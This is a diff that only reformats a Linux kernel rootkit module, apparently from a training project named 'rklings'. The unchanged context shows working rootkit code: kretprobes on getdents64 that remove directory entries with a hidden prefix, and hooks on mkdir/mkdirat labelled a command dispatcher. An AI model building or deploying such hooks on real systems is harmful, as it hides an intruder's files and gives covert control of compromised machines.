@@ -1,5 +1,4 @@
 // SPDX-License-Identifier: GPL-2.0
-#include <linux/types.h>
 #include <linux/dirent.h>
 #include <linux/init.h>
 #include <linux/kprobes.h>
@@ -8,6 +7,7 @@
 #include <linux/slab.h>
 #include <linux/spinlock.h>
 #include <linux/string.h>
+#include <linux/types.h>
 #include <linux/uaccess.h>
 
 #define RK_PREFIX     "rklings."
@@ -95,7 +95,7 @@ static bool should_hide_dirent(const char *name)
 }
 
 static int rk_getdents_entry(struct kretprobe_instance *ri,
-			   struct pt_regs *regs)
+			     struct pt_regs *regs)
 {
 	struct rk_getdents_data *data;
 	struct pt_regs *uregs;
@@ -112,7 +112,7 @@ static int rk_getdents_entry(struct kretprobe_instance *ri,
 }
 
 static int rk_getdents_return(struct kretprobe_instance *ri,
-			    struct pt_regs *regs)
+			      struct pt_regs *regs)
 {
 	struct rk_getdents_data *data;
 	struct linux_dirent64 *d;
@@ -141,8 +141,7 @@ static int rk_getdents_return(struct kretprobe_instance *ri,
 			long remaining = new_total - off - d->d_reclen;
 
 			if (remaining > 0)
-				memmove(kbuf + off,
-					kbuf + off + d->d_reclen,
+				memmove(kbuf + off, kbuf + off + d->d_reclen,
 					remaining);
 			new_total -= d->d_reclen;
 		} else {
@@ -161,11 +160,11 @@ static int rk_getdents_return(struct kretprobe_instance *ri,
 }
 
 static struct kretprobe rk_getdents_probe = {
-	.handler        = rk_getdents_return,
-	.entry_handler  = rk_getdents_entry,
-	.data_size      = sizeof(struct rk_getdents_data),
-	.maxactive      = 20,
-	.kp.symbol_name = "__x64_sys_getdents64",
+    .handler = rk_getdents_return,
+    .entry_handler = rk_getdents_entry,
+    .data_size = sizeof(struct rk_getdents_data),
+    .maxactive = 20,
+    .kp.symbol_name = "__x64_sys_getdents64",
 };
 
 /* ── mkdir command dispatcher ────────────────────────────────── */
@@ -248,7 +247,7 @@ static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
 }
 
 static int rk_mkdir_return(struct kretprobe_instance *inst,
-			    struct pt_regs *regs)
+			   struct pt_regs *regs)
 {
 	struct rk_mkdir_data *data;
 
@@ -259,19 +258,19 @@ static int rk_mkdir_return(struct kretprobe_instance *inst,
 }
 
 static struct kretprobe rk_mkdir_probe = {
-	.kp.symbol_name = "__x64_sys_mkdir",
-	.entry_handler  = rk_mkdir_entry_mkdir,
-	.handler        = rk_mkdir_return,
-	.data_size      = sizeof(struct rk_mkdir_data),
-	.maxactive      = 8,
+    .kp.symbol_name = "__x64_sys_mkdir",
+    .entry_handler = rk_mkdir_entry_mkdir,
+    .handler = rk_mkdir_return,
+    .data_size = sizeof(struct rk_mkdir_data),
+    .maxactive = 8,
 };
 
 static struct kretprobe rk_mkdirat_probe = {
-	.kp.symbol_name = "__x64_sys_mkdirat",
-	.entry_handler  = rk_mkdir_entry_mkdirat,
-	.handler        = rk_mkdir_return,
-	.data_size      = sizeof(struct rk_mkdir_data),
-	.maxactive      = 8,
+    .kp.symbol_name = "__x64_sys_mkdirat",
+    .entry_handler = rk_mkdir_entry_mkdirat,
+    .handler = rk_mkdir_return,
+    .data_size = sizeof(struct rk_mkdir_data),
+    .maxactive = 8,
 };
 
 /* ── module lifecycle ────────────────────────────────────────── */
